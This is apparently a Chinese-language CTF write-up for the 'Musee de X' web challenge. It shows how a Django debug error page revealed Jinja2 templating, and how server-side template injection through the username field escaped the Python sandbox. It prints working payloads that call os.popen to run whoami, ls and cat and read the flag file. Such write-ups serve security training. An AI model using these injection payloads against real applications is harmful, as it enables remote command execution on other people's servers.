# Musee de X

## Description

http://106.75.72.168:8888/

X在卢浮宫旁开了一个博物馆，欢迎社会各界人士捐献藏品。

## Solution

首先是注册，接着就是捐献了。捐献的时候随便输入一个 url，就会出现报错信息。因为这个网站的后台开启了 debug 模式，所以可以看到报错信息。通过报错信息可以看到后台是 django,还可以看到一个比较重要的信息，就是模板是使用 Jinjia2.

[![iSLMcD.md.png](https://s1.ax1x.com/2018/09/04/iSLMcD.md.png)](https://imgchr.com/i/iSLMcD)

通过以上的信息，差不多可以判断出这是一个 python 沙箱绕过的题目。在 python2.7 的环境下，输入以下命令就可以执行系统命令 whoami：

```shell
 [].__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].popen("whoami").read()
```

捐献之后，用户名会回显在图片之上：

[![iSLH4x.md.png](https://s1.ax1x.com/2018/09/04/iSLH4x.md.png)](https://imgchr.com/i/iSLH4x)

另外还有一点需要注意，捐献的用户名和登陆的用户名必须一致，否则就会提示 `Screw u, hacker!`。现在我们的思路就是通过用户名来进行注入，然后将结果回显到图片上。我们可以找到一张[全黑的图片](http://telecom.26923.com/download/pic/000/325/bce2e25c7e12c1567faf9a39979a9f7e.jpg)。首先尝试使用 ls 来列出所有的文件夹：

```shell
{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].popen("ls").read() }}
```

[![iSOK5q.md.png](https://s1.ax1x.com/2018/09/04/iSOK5q.md.png)](https://imgchr.com/i/iSOK5q)

通过这个命令可以把文件路径列出来，我们可以看到一个文件 flag_92a3ed4f844d，接着可以通过 cat 来将 flag 信息显示出来：

```shell
{{ [].__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].popen("cat flag_92a3ed4f844d").read() }}
```

[![iSO4Rf.md.png](https://s1.ax1x.com/2018/09/04/iSO4Rf.md.png)](https://imgchr.com/i/iSO4Rf)

